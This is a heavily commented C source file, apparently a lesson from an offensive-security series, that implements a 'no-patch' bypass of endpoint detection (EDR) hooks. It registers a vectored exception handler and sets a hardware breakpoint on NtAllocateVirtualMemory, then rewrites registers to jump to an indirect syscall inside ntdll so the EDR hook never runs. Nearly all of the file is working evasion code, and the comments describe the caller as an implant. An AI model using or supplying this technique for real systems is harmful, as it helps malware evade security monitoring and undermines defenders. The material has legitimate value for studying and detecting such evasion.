/*
 * 08_veh_hwbp_syscall.c
 * ======================
 * VEH + Hardware Breakpoint - "No-Patch Bypass"
 *
 * This is the most elegant hook bypass technique.
 * It does NOT modify ANY byte in memory - the EDR hooks remain intact.
 * It uses processor hardware resources (debug registers) and the
 * Windows exception mechanism (VEH) to redirect execution.
 *
 * Flow:
 *   1. Register a VEH handler (function that handles exceptions)
 *   2. Set a hardware breakpoint at the address of the hooked function
 *   3. When the function is called, the processor generates an exception
 *   4. The VEH handler intercepts BEFORE the EDR hook executes
 *   5. The handler modifies the registers to execute the syscall directly
 *   6. The original function (and the hook) never actually executes
 *
 * Why "no-patch":
 *   - Unhooking: modifies ntdll bytes (detectable by integrity check)
 *   - Direct syscall: suspicious call stack (syscall inside the implant's .text)
 *   - VEH+HWBP: doesn't modify anything, call stack can look normal
 *
 * Compile: cl.exe /O2 08_veh_hwbp_syscall.c
 */

#include <windows.h>
#include <stdio.h>

/*
 * Structure to store information about a syscall
 * we want to intercept via hardware breakpoint.
 *
 * functionAddress: where the function starts in ntdll (hooked address)
 * ssn: System Service Number (the syscall number in the kernel)
 * syscallAddress: address of a legitimate "syscall; ret" instruction
 *                 inside ntdll (for indirect syscall)
 */
typedef struct _SYSCALL_INFO {
    PVOID functionAddress;    /* e.g.: address of NtAllocateVirtualMemory */
    DWORD ssn;                /* e.g.: 0x18 */
    PVOID syscallAddress;     /* e.g.: address of "syscall" inside another function */
} SYSCALL_INFO;

/* Global: information about the syscall we're intercepting */
SYSCALL_INFO g_syscallInfo = { 0 };


/* ---------------------------------------------------------------
 * setHardwareBreakpoint - Configures a hardware breakpoint
 *
 * Hardware breakpoints use the processor's debug registers:
 *   Dr0, Dr1, Dr2, Dr3 -> breakpoint addresses (up to 4 simultaneous)
 *   Dr6 -> status (which breakpoint fired)
 *   Dr7 -> control (enable/disable, type, size)
 *
 * When the processor executes an instruction at a Dr0-Dr3 address,
 * it generates a STATUS_SINGLE_STEP exception (0x80000004) BEFORE
 * the instruction executes. This is crucial: the exception happens
 * BEFORE the EDR hook runs.
 *
 * Dr7 (control register) simplified layout:
 *   Bit 0: enable Dr0 local
 *   Bit 2: enable Dr1 local
 *   Bits 16-17: Dr0 condition (00 = execution, 01 = write, 11 = read/write)
 *   Bits 18-19: Dr0 size (00 = 1 byte)
 *
 * Parameters:
 *   hThread  -> handle of the thread to configure
 *   address  -> address where to place the breakpoint
 *   index    -> which register to use (0=Dr0, 1=Dr1, 2=Dr2, 3=Dr3)
 * --------------------------------------------------------------- */
BOOL setHardwareBreakpoint(HANDLE hThread, PVOID address, int index) {

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS; /* we only want the debug registers */

    if (!GetThreadContext(hThread, &ctx)) {
        printf("[!] Failed to get debug context\n");
        return FALSE;
    }

    /* Place the address in the correct Dr register */
    switch (index) {
        case 0: ctx.Dr0 = (DWORD_PTR)address; break;
        case 1: ctx.Dr1 = (DWORD_PTR)address; break;
        case 2: ctx.Dr2 = (DWORD_PTR)address; break;
        case 3: ctx.Dr3 = (DWORD_PTR)address; break;
    }

    /*
     * Enable the breakpoint in Dr7:
     * (1 << (index * 2)) sets the "local enable" bit for the chosen register.
     *
     * The condition bits stay at 00 (execution breakpoint) by default,
     * so we don't need to set anything else.
     */
    ctx.Dr7 |= (1 << (index * 2));

    if (!SetThreadContext(hThread, &ctx)) {
        printf("[!] Failed to configure breakpoint\n");
        return FALSE;
    }

    return TRUE;
}


/* ---------------------------------------------------------------
 * removeHardwareBreakpoint - Removes the hardware breakpoint
 * --------------------------------------------------------------- */
BOOL removeHardwareBreakpoint(HANDLE hThread, int index) {

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(hThread, &ctx);

    /* Zero the Dr register and disable in Dr7 */
    switch (index) {
        case 0: ctx.Dr0 = 0; break;
        case 1: ctx.Dr1 = 0; break;
        case 2: ctx.Dr2 = 0; break;
        case 3: ctx.Dr3 = 0; break;
    }
    ctx.Dr7 &= ~(1 << (index * 2));

    return SetThreadContext(hThread, &ctx);
}


/* ---------------------------------------------------------------
 * vehHandler - Vectored Exception Handler
 *
 * This function is called AUTOMATICALLY by Windows when
 * an exception occurs in our process - BEFORE any
 * other handler (including SEH frames).
 *
 * When the hardware breakpoint fires, the processor generates
 * EXCEPTION_SINGLE_STEP. Our handler:
 *
 *   1. Checks if the exception is the right type (SINGLE_STEP)
 *   2. Checks if RIP (instruction pointer) is at the address
 *      of the function we want to intercept
 *   3. If yes: modifies EAX (sets the SSN) and RIP (jumps to syscall)
 *   4. Returns EXCEPTION_CONTINUE_EXECUTION (continues executing
 *      from the modified RIP)
 *
 * The result: the hooked function NEVER EXECUTES. The processor jumps
 * directly to the "syscall" instruction inside ntdll, with the correct SSN
 * in EAX. The kernel executes the function and returns normally.
 *
 * ExceptionInfo contains:
 *   - ExceptionRecord: exception type, address where it occurred
 *   - ContextRecord: all registers at the time of the exception
 *     (Rip, Rax, Rcx, Rdx, R8, R9, etc)
 * --------------------------------------------------------------- */
LONG WINAPI vehHandler(PEXCEPTION_POINTERS ExceptionInfo) {

    /* Check if it's SINGLE_STEP (hardware breakpoint) */
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {

        /*
         * Check if RIP (where the exception occurred) is the address
         * of the function we're intercepting.
         *
         * RIP = instruction pointer in x64
         * It's the register that says "which instruction to execute now"
         */
        if ((PVOID)ExceptionInfo->ContextRecord->Rip == g_syscallInfo.functionAddress) {

            printf("    [VEH] Breakpoint fired at 0x%llx\n",
                   ExceptionInfo->ContextRecord->Rip);

            /*
             * We modify the registers:
             *
             * R10 = RCX: Windows syscall convention.
             *   The kernel expects the first argument in R10.
             *   Normally ntdll does "mov r10, rcx" at the beginning.
             *   Since we're skipping ntdll, we need to do it ourselves.
             *
             * EAX = SSN: System Service Number.
             *   Tells the kernel WHICH function to execute.
             *
             * RIP = syscallAddress: we jump to a legitimate "syscall"
             *   instruction inside ntdll. This is indirect syscall:
             *   the call stack shows the syscall came from ntdll,
             *   not from our code.
             */
            ExceptionInfo->ContextRecord->R10 = ExceptionInfo->ContextRecord->Rcx;
            ExceptionInfo->ContextRecord->Rax = g_syscallInfo.ssn;
            ExceptionInfo->ContextRecord->Rip = (DWORD64)g_syscallInfo.syscallAddress;

            printf("    [VEH] Redirected: SSN=0x%llx, syscall at 0x%llx\n",
                   ExceptionInfo->ContextRecord->Rax,
                   ExceptionInfo->ContextRecord->Rip);

            /*
             * EXCEPTION_CONTINUE_EXECUTION = "continue executing"
             * The processor will resume execution at the RIP we set,
             * which is the address of the "syscall" instruction in ntdll.
             * The EDR hook never executed.
             */
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    /* Not our exception - pass to the next handler */
    return EXCEPTION_CONTINUE_SEARCH;
}


/* ---------------------------------------------------------------
 * findSyscallStub - Searches for a "syscall; ret" instruction in ntdll
 *
 * For indirect syscall, we need to find the address of a
 * "syscall" instruction followed by "ret" inside ntdll.
 *
 * We search for the bytes: 0x0F, 0x05 (syscall), 0xC3 (ret)
 * in any Nt* function of ntdll.
 *
 * It doesn't matter WHICH function - the syscall instruction is generic.
 * What matters is the SSN in EAX (which we control).
 * --------------------------------------------------------------- */
PVOID findSyscallStub() {

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    /* Get the address of any function as a starting point */
    BYTE* func = (BYTE*)GetProcAddress(hNtdll, "NtClose");
    if (func == NULL) return NULL;

    /* Scan the bytes looking for the pattern syscall(0F 05) + ret(C3) */
    for (int i = 0; i < 64; i++) {
        if (func[i] == 0x0F && func[i+1] == 0x05 && func[i+2] == 0xC3) {
            return (PVOID)&func[i]; /* address of the syscall instruction */
        }
    }

    return NULL;
}


int main() {

    printf("[*] VEH + Hardware Breakpoint Syscall Bypass\n");
    printf("[*] ==========================================\n\n");

    /* ---------------------------------------------------------------
     * STEP 1: Prepare syscall information
     * --------------------------------------------------------------- */

    /* Address of NtAllocateVirtualMemory in ntdll (may be hooked) */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    g_syscallInfo.functionAddress = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    g_syscallInfo.ssn = 0x18;  /* SSN for Win10 21H2 - varies by version */
    g_syscallInfo.syscallAddress = findSyscallStub();

    if (g_syscallInfo.functionAddress == NULL || g_syscallInfo.syscallAddress == NULL) {
        printf("[!] Failed to resolve addresses\n");
        return 1;
    }

    printf("[+] NtAllocateVirtualMemory: 0x%p (possibly hooked)\n", g_syscallInfo.functionAddress);
    printf("[+] Syscall stub found: 0x%p\n", g_syscallInfo.syscallAddress);
    printf("[+] SSN: 0x%x\n", g_syscallInfo.ssn);

    /* ---------------------------------------------------------------
     * STEP 2: Register VEH handler
     *
     * AddVectoredExceptionHandler(1, handler)
     *   1 = register as FIRST handler (maximum priority)
     *   handler = our exception handling function
     *
     * From here on, EVERY exception in the process goes through our
     * handler before any other.
     * --------------------------------------------------------------- */
    PVOID registeredHandler = AddVectoredExceptionHandler(1, vehHandler);
    if (registeredHandler == NULL) {
        printf("[!] Failed to register VEH handler\n");
        return 1;
    }
    printf("[+] VEH handler registered\n");

    /* ---------------------------------------------------------------
     * STEP 3: Configure hardware breakpoint
     *
     * Place an execution breakpoint at the BEGINNING of
     * NtAllocateVirtualMemory. When any code tries to
     * execute this function, the processor generates an exception
     * BEFORE the first instruction (and BEFORE the EDR hook).
     * --------------------------------------------------------------- */
    HANDLE hThread = GetCurrentThread();

    if (!setHardwareBreakpoint(hThread, g_syscallInfo.functionAddress, 0)) {
        printf("[!] Failed to configure hardware breakpoint\n");
        return 1;
    }
    printf("[+] Hardware breakpoint active on Dr0\n\n");

    /* ---------------------------------------------------------------
     * STEP 4: Call the function normally
     *
     * When we call NtAllocateVirtualMemory NORMALLY
     * (via function pointer), the following happens:
     *
     *   1. CPU tries to execute the first byte of NtAllocateVirtualMemory
     *   2. Hardware breakpoint fires -> SINGLE_STEP exception
     *   3. Our VEH handler intercepts
     *   4. Handler changes R10, EAX, RIP
     *   5. Execution continues at the "syscall" instruction in ntdll
     *   6. Kernel executes NtAllocateVirtualMemory and returns
     *   7. EDR hook NEVER EXECUTED
     *
     * From the caller's perspective, it's as if the function was called
     * normally. But internally, the hook was bypassed.
     * --------------------------------------------------------------- */
    printf("[*] Calling NtAllocateVirtualMemory (via normal pointer)...\n");

    /* Define the function pointer type */
    typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
        HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG
    );

    /* Use the HOOKED address - the breakpoint handles the bypass */
    pNtAllocateVirtualMemory NtAlloc = (pNtAllocateVirtualMemory)g_syscallInfo.functionAddress;

    PVOID base = NULL;
    SIZE_T size = 4096;

    NTSTATUS status = NtAlloc(
        GetCurrentProcess(),
        &base,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    printf("\n[+] Result: NTSTATUS = 0x%08x\n", status);
    if (status == 0) {
        printf("[+] Memory allocated at: 0x%p\n", base);
        printf("[+] Bypass successful - EDR hook was ignored!\n");
    }

    /* Cleanup */
    removeHardwareBreakpoint(hThread, 0);
    RemoveVectoredExceptionHandler(registeredHandler);

    if (base) VirtualFree(base, 0, MEM_RELEASE);

    printf("\n[*] No bytes were modified in ntdll.\n");
    printf("[*] No hooks were removed.\n");
    printf("[*] The EDR still has its hooks intact, but it saw nothing.\n");

    return 0;
}
